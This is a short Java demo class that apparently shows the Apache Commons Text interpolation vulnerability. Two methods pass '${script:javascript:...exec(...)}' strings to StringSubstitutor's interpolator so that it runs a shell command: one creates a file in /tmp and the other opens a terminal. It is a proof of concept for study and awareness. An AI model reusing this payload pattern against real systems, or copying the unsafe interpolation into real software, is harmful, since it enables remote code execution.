package org.schreibvehler.vulnerability.demo;

import org.apache.commons.text.StringSubstitutor;

public class CommonsTextVulnerability {

    public void useInterpolatorToCreateAFile() {
        StringBuilder sb = new StringBuilder();
        sb.append("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/interpolatorBlub')}");

        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String result = interpolator.replace(sb);
        System.out.println("result: " + result);
    }

    public void useInterpolatorToStartATerminal() {
        StringBuilder sb = new StringBuilder();
        sb.append("${script:javascript:java.lang.Runtime.getRuntime().exec('terminator')}");

        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String result = interpolator.replace(sb);
        System.out.println("result: " + result);
    }
}
